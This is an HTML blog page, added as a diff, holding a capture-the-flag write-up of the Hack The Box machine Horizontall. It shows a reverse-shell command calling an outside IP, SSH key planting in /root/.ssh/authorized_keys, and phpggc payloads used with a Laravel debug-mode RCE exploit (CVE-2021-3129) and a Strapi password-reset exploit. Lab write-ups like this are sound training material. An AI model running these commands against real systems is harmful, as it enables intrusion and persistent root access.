@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Horizontall | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="1.nmap scanfirst we add the host to &#x2F;etc&#x2F;hosts echo &quot;10.10.11.105 horizontall.htb&quot; &gt;&gt; &#x2F;etc&#x2F;hosts    2.getting web accessthe website don’t have any button can link to other pa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Horizontall">
+<meta property="og:url" content="http://example.com/2022/07/17/Horizontall/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1.nmap scanfirst we add the host to &#x2F;etc&#x2F;hosts echo &quot;10.10.11.105 horizontall.htb&quot; &gt;&gt; &#x2F;etc&#x2F;hosts    2.getting web accessthe website don’t have any button can link to other pa">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/nmap.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/js1.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/js2.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/access.jpg">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/dirsearch.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/json.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/strapi.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/getversion.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/curl.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/web.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/shell.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/netstat.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/8000.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/ssh.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/8000local.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/page.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/profiles.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/root.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/rce.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/final.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/suid.png">
+<meta property="og:image" content="http://example.com/2022/07/17/Horizontall/xxd.png">
+<meta property="article:published_time" content="2022-07-17T14:08:02.000Z">
+<meta property="article:modified_time" content="2022-07-18T13:57:12.779Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/07/17/Horizontall/nmap.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Horizontall" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/17/Horizontall/" class="article-date">
+  <time class="dt-published" datetime="2022-07-17T14:08:02.000Z" itemprop="datePublished">2022-07-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Horizontall
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><p>first we add the host to &#x2F;etc&#x2F;hosts</p>
+<pre><code>echo &quot;10.10.11.105 horizontall.htb&quot; &gt;&gt; /etc/hosts
+</code></pre>
+<img src="/2022/07/17/Horizontall/nmap.png">
+
+<h4 id="2-getting-web-access"><a href="#2-getting-web-access" class="headerlink" title="2.getting web access"></a>2.getting web access</h4><p>the website don’t have any button can link to other pages<br>the page has two js file,and we can read them to find something<br><img src="/2022/07/17/Horizontall/js1.png" width="70%"><br><img src="/2022/07/17/Horizontall/js2.png" width="100%"></p>
+<p>The JavaScript in app.c68eb462.js is minified, but tossing it into a <a target="_blank" rel="noopener" href="https://www.qianbo.com.cn/Tool/Beautify/Js-Formatter.html">jsFormatter</a> returns 654 lines of JavaScript. Glancing through it, this section jumped out because it reveals a subdomain:<br><img src="/2022/07/17/Horizontall/access.jpg" width="70%"></p>
+<p>after this,i also use firsearch and fuzz to test the website,but we don’t have some useful information<br>so we first add the <code>api-prod.horizontall.htb</code> to &#x2F;etc&#x2F;hosts</p>
+<pre><code>echo &quot;10.10.11.105 api-prod.horizontall.htb&quot; &gt;&gt; /etc/hosts
+</code></pre>
+<p>and visit the page and use dirsearch the site,we can see some admin pages and a &#x2F;reviews page<br><img src="/2022/07/17/Horizontall/dirsearch.png" width="70%"><br>the reviews page returns a json string<br><img src="/2022/07/17/Horizontall/json.png" width="70%"><br>in the admin page,we know it build with strapi<br>we can use searchsploit to search and use msfconsole to make some exploit<br><img src="/2022/07/17/Horizontall/strapi.png" width="70%"><br>we can see the poc and get the way to know the version<br><img src="/2022/07/17/Horizontall/getversion.png" width="70%"><br><img src="/2022/07/17/Horizontall/curl.png" width="70%"><br>the version greatly match the exploit,so we can try to change the password<br><img src="/2022/07/17/Horizontall/web.png" width="70%"><br>we can use the command to reverse a shell</p>
+<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39;
+</code></pre>
+<img src="/2022/07/17/Horizontall/shell.png" width="70%">
+and use the command to get a interactive shell
+
+<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<p>in the <code>/home/developer</code>,we don’t have permission</p>
+<h4 id="3-getting-root-acccess"><a href="#3-getting-root-acccess" class="headerlink" title="3.getting root acccess"></a>3.getting root acccess</h4><p>the existence of a <code>composer-setup.php</code> file suggests there’s some kind of PHP site in use here.<br>Looking at the <code>netstat</code>, there’s the site on 80, and a NodeJS side on 1337. There’s also MySQL on 3306 (which makes sense). But there’s also something on 8000:<br><img src="/2022/07/17/Horizontall/netstat.png" width="70%"><br>The service on 8000 is an HTTP server:<br><img src="/2022/07/17/Horizontall/8000.png" width="70%"><br>And based on the response and the cookies, it looks like Laravel, a PHP framework.</p>
+<h5 id="page-access"><a href="#page-access" class="headerlink" title="page access"></a>page access</h5><p>the strapi user’s home directory is &#x2F;opt&#x2F;strapi, I can still add a .ssh directory and an authorized_keys file. I’ll add my key:<br><img src="/2022/07/17/Horizontall/ssh.png" width="70%"><br><img src="/2022/07/17/Horizontall/8000local.png" width="70%"><br>now we get a default page running in localhost:8000<br><img src="/2022/07/17/Horizontall/page.png" width="70%"><br>use dirsearch and we can find a &#x2F;profiles<br><img src="/2022/07/17/Horizontall/profiles.png" width="70%"><br>But not only does it crash, but it returns a bunch of information. This is Laravel debug mode.</p>
+<h5 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit 1"></a>exploit 1</h5><p>the laravel has a remote code execution &lt;&#x3D;v8.4.2 Debug Mode<br>we can get a poc from <a target="_blank" rel="noopener" href="https://github.com/zhzyker/CVE-2021-3129">repo</a><br><img src="/2022/07/17/Horizontall/root.png" width="70%"><br>Reviewing the code we see where the id command is being executed:<br><img src="/2022/07/17/Horizontall/rce.png" width="70%"><br>we can set the SUID bit to bash for a quick privilege escalation to root shown in the rce2:<br><img src="/2022/07/17/Horizontall/final.png" width="70%"><br>we can see that the SUID is set with ls -l &#x2F;bin&#x2F;bash<br><img src="/2022/07/17/Horizontall/suid.png" width="70%"></p>
+<h5 id="exploit-2"><a href="#exploit-2" class="headerlink" title="exploit 2"></a>exploit 2</h5><p>To show it works, I’ll start with the id command. First, I’ll generate the payload using phpggc:</p>
+<pre><code>php -d&#39;phar.readonly=0&#39; /opt/phpggc/phpggc --phar phar -o id.phar --fast-destruct monolog/rce1 system id
+</code></pre>
+<p>This creates a serialized PHP file, which I saved as id.phar. The file looks like a PHP object:<br><img src="/2022/07/17/Horizontall/xxd.png" width="70%"><br>the command,<code>id</code>, is on line 0x000000f0.<br>Now I’ll run the <a target="_blank" rel="noopener" href="https://github.com/ambionics/laravel-exploits">Python script</a>, passing it the serialized payload:</p>
+<pre><code>python3 /opt/laravel-exploits/laravel-ignition-rce.py http://127.0.0.1:8000 id.phar 
+</code></pre>
+<p>to get a shell,we can regenerate a new payload, this time creating &#x2F;root&#x2F;.ssh if it doesn’t exist, and then writing my SSH key to authorized_keys:</p>
+<pre><code>php -d&#39;phar.readonly=0&#39; /opt/phpggc/phpggc --phar phar -o ssh.phar --fast-destruct monolog/rce1 system &#39;mkdir -p /root/.ssh; echo &quot;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing&quot; &gt;&gt; /root/.ssh/authorized_keys&#39;
+</code></pre>
+<p>Run the exploit again,and  we can also get the root access.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/17/Horizontall/" data-id="cl5s5p57m0003k4cpev94dh41" data-title="Horizontall" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/18/Delivery/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Delivery
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/16/Previse/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Previse</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/07/18/Delivery/">Delivery</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/17/Horizontall/">Horizontall</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/16/Previse/">Previse</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/16/Armageddon/">Armageddon</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/15/Forlic/">Forlic</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
